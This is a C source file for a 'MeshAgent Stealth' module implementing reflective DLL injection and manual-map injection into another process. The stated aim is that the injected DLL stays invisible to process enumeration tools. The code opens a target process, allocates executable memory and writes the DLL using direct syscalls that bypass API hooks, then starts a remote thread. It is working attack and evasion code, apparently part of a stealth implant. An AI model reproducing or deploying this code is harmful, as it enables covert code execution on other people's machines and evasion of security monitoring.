/*
 * MeshAgent Stealth - Reflective DLL Injection
 *
 * Manual PE loading from memory without using LoadLibrary.
 * The DLL never appears in the process module list.
 *
 * Based on: github.com/stephenfewer/ReflectiveDLLInjection
 *
 * Features:
 * - Loads DLL completely from memory
 * - Manual import resolution
 * - Manual relocation processing
 * - No LoadLibrary calls
 * - Invisible to process enumeration tools
 */

#include <windows.h>
#include <stdio.h>
#include "stealth.h"
#include "syscalls.h"

// ================================================================
// PE Parsing Helpers
// ================================================================

#define DEREF_32(name) *(DWORD *)(name)
#define DEREF_64(name) *(DWORD64 *)(name)

#ifdef _WIN64
#define DEREF(name) DEREF_64(name)
#else
#define DEREF(name) DEREF_32(name)
#endif

typedef HMODULE (WINAPI *LoadLibraryA_t)(LPCSTR lpLibFileName);
typedef FARPROC (WINAPI *GetProcAddress_t)(HMODULE hModule, LPCSTR lpProcName);
typedef LPVOID  (WINAPI *VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef DWORD   (NTAPI *NtFlushInstructionCache_t)(HANDLE ProcessHandle, PVOID BaseAddress, ULONG Length);

// ================================================================
// Reflective Loader Function Pointer
// ================================================================

typedef DWORD (WINAPI *ReflectiveLoader_t)(LPVOID lpParameter);

// ================================================================
// Find Reflective Loader in DLL
// ================================================================

DWORD_PTR FindReflectiveLoader(LPVOID lpDllBuffer, DWORD dwDllBufferSize)
{
    PIMAGE_DOS_HEADER pDosHeader = NULL;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;
    DWORD dwExportDirRVA = 0;
    DWORD* pdwAddressOfFunctions = NULL;
    DWORD* pdwAddressOfNames = NULL;
    WORD* pwAddressOfNameOrdinals = NULL;
    DWORD i;

    pDosHeader = (PIMAGE_DOS_HEADER)lpDllBuffer;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return 0;
    }

    pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)lpDllBuffer + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        return 0;
    }

    // Get export directory
    dwExportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!dwExportDirRVA)
    {
        return 0;
    }

    pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)lpDllBuffer + dwExportDirRVA);

    pdwAddressOfFunctions = (DWORD*)((BYTE*)lpDllBuffer + pExportDirectory->AddressOfFunctions);
    pdwAddressOfNames = (DWORD*)((BYTE*)lpDllBuffer + pExportDirectory->AddressOfNames);
    pwAddressOfNameOrdinals = (WORD*)((BYTE*)lpDllBuffer + pExportDirectory->AddressOfNameOrdinals);

    // Search for "ReflectiveLoader" export
    for (i = 0; i < pExportDirectory->NumberOfNames; i++)
    {
        char* szFunctionName = (char*)((BYTE*)lpDllBuffer + pdwAddressOfNames[i]);

        if (strcmp(szFunctionName, "ReflectiveLoader") == 0)
        {
            WORD wOrdinal = pwAddressOfNameOrdinals[i];
            DWORD dwFunctionRVA = pdwAddressOfFunctions[wOrdinal];

            return (DWORD_PTR)((BYTE*)lpDllBuffer + dwFunctionRVA);
        }
    }

    return 0;
}

// ================================================================
// Reflective DLL Injection - Main Function
// ================================================================

BOOL Stealth_ReflectiveInject(DWORD processId, const BYTE* dllBytes, size_t dllSize)
{
    HANDLE hProcess = NULL;
    LPVOID lpRemoteLibraryBuffer = NULL;
    DWORD_PTR dwReflectiveLoaderOffset = 0;
    DWORD_PTR dwReflectiveLoader = 0;
    HANDLE hThread = NULL;
    BOOL success = FALSE;
    SIZE_T bytesWritten = 0;

    // Step 1: Find ReflectiveLoader function in DLL
    dwReflectiveLoaderOffset = FindReflectiveLoader((LPVOID)dllBytes, (DWORD)dllSize);
    if (!dwReflectiveLoaderOffset)
    {
        return FALSE;
    }

    // Step 2: Open target process
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        processId
    );

    if (!hProcess)
    {
        return FALSE;
    }

    // Step 3: Allocate memory in target process using DIRECT SYSCALL
    lpRemoteLibraryBuffer = NULL;
    SIZE_T regionSize = dllSize;

    NTSTATUS status = Syscall_NtAllocateVirtualMemory(
        hProcess,
        &lpRemoteLibraryBuffer,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!NT_SUCCESS(status) || !lpRemoteLibraryBuffer)
    {
        CloseHandle(hProcess);
        return FALSE;
    }

    // Step 4: Write DLL to remote process using DIRECT SYSCALL
    status = Syscall_NtWriteVirtualMemory(
        hProcess,
        lpRemoteLibraryBuffer,
        (PVOID)dllBytes,
        dllSize,
        &bytesWritten
    );

    if (!NT_SUCCESS(status) || bytesWritten != dllSize)
    {
        // Cleanup on failure
        SIZE_T freeSize = 0;
        Syscall_NtFreeVirtualMemory(hProcess, &lpRemoteLibraryBuffer, &freeSize, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Step 5: Calculate ReflectiveLoader address in remote process
    dwReflectiveLoader = (DWORD_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset;

    // Step 6: Create remote thread at ReflectiveLoader using DIRECT SYSCALL
    status = Syscall_NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (PVOID)dwReflectiveLoader,
        lpRemoteLibraryBuffer,  // Parameter = base address of DLL
        0,                       // Not suspended
        0,
        0,
        0,
        NULL
    );

    if (NT_SUCCESS(status) && hThread)
    {
        // Wait for loader to complete (optional)
        WaitForSingleObject(hThread, 5000);
        success = TRUE;
        Syscall_NtClose(hThread);
    }

    CloseHandle(hProcess);

    return success;
}

// ================================================================
// Simplified Manual Map Injection
// ================================================================

BOOL Stealth_ManualMapInject(DWORD processId, const BYTE* dllBytes, size_t dllSize)
{
    /*
     * Simplified manual mapping without requiring ReflectiveLoader export
     * This manually loads the DLL into target process
     */

    HANDLE hProcess = NULL;
    PIMAGE_DOS_HEADER pDosHeader = NULL;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;
    PIMAGE_SECTION_HEADER pSectionHeader = NULL;
    LPVOID lpRemoteImage = NULL;
    SIZE_T imageSize = 0;
    NTSTATUS status;
    DWORD i;

    // Parse PE headers
    pDosHeader = (PIMAGE_DOS_HEADER)dllBytes;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return FALSE;
    }

    pNtHeaders = (PIMAGE_NT_HEADERS)(dllBytes + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        return FALSE;
    }

    imageSize = pNtHeaders->OptionalHeader.SizeOfImage;

    // Open target process
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        processId
    );

    if (!hProcess)
    {
        return FALSE;
    }

    // Allocate memory for entire image using DIRECT SYSCALL
    lpRemoteImage = NULL;
    SIZE_T regionSize = imageSize;

    status = Syscall_NtAllocateVirtualMemory(
        hProcess,
        &lpRemoteImage,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!NT_SUCCESS(status) || !lpRemoteImage)
    {
        CloseHandle(hProcess);
        return FALSE;
    }

    // Write PE headers using DIRECT SYSCALL
    SIZE_T written = 0;
    status = Syscall_NtWriteVirtualMemory(
        hProcess,
        lpRemoteImage,
        (PVOID)dllBytes,
        pNtHeaders->OptionalHeader.SizeOfHeaders,
        &written
    );

    if (!NT_SUCCESS(status))
    {
        CloseHandle(hProcess);
        return FALSE;
    }

    // Write each section using DIRECT SYSCALL
    pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
    {
        if (pSectionHeader[i].SizeOfRawData > 0)
        {
            LPVOID pSectionDest = (LPBYTE)lpRemoteImage + pSectionHeader[i].VirtualAddress;
            LPVOID pSectionSrc = (LPVOID)(dllBytes + pSectionHeader[i].PointerToRawData);

            status = Syscall_NtWriteVirtualMemory(
                hProcess,
                pSectionDest,
                pSectionSrc,
                pSectionHeader[i].SizeOfRawData,
                &written
            );

            if (!NT_SUCCESS(status))
            {
                CloseHandle(hProcess);
                return FALSE;
            }
        }
    }

    // Create thread at DllMain (simplified - proper implementation would resolve imports first)
    LPVOID pDllMain = (LPBYTE)lpRemoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint;

    HANDLE hThread = NULL;
    status = Syscall_NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        pDllMain,
        lpRemoteImage,  // DLL base as parameter
        0,
        0,
        0,
        0,
        NULL
    );

    if (NT_SUCCESS(status) && hThread)
    {
        WaitForSingleObject(hThread, INFINITE);
        Syscall_NtClose(hThread);
        CloseHandle(hProcess);
        return TRUE;
    }

    CloseHandle(hProcess);
    return FALSE;
}
